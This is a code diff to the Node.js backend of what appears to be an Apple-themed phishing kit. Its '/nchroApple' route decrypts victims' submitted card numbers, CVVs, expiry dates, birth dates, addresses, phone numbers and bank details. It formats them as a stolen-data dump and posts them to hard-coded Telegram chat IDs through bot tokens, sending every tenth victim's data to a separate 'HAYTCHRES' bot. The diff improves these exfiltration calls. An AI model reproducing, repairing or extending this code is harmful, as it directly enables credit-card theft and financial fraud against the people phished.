@@ -8148,12 +8148,12 @@ app.post("/nchroApple", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
+  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
   ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -8182,17 +8182,44 @@ app.post("/nchroApple", (req, res) => {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (nchroCount == 10) {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         nchroCount = 4;
       } else {
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleNchro:\n${originalText}`
-        );
-        axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=956029722&text=Apple:\n${originalText}`
-        );
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `AppleNchro:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 956029722,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
         nchroCount += 1;
       }
     });
